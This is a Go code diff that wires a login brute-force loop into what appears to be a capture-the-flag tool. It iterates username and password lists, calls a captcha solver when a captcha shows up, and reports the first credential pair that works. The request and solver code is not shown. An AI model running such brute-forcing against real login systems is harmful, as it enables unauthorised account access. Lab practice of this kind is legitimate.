@@ -2,6 +2,7 @@
 package main
 
 import (
+	"Menchen13/Capture-Returns/brute"
 	"Menchen13/Capture-Returns/captcha"
 	"errors"
 	"flag"
@@ -52,16 +53,20 @@ func main() {
 
 	//main bruteloop
 
-	for i, v := range userSlice {
-		for j, k := range passSlice {
+	for _, v := range userSlice {
+		for _, k := range passSlice {
+
 			if captcha.IsCaptcha(resp) {
+				captcha.Solver(u)
 
+			} else if brute.Orca(v, k) {
+				fmt.Println("Done! Found combination:  ", v, ":", k)
+				return
 			}
-			//if it does call function to beat all captchas
-
-			//try user pas combi
 		}
+		fmt.Println("Finished username: ", v)
 	}
+	fmt.Println("Failed to find valid user:pass combination!")
 
 }
 
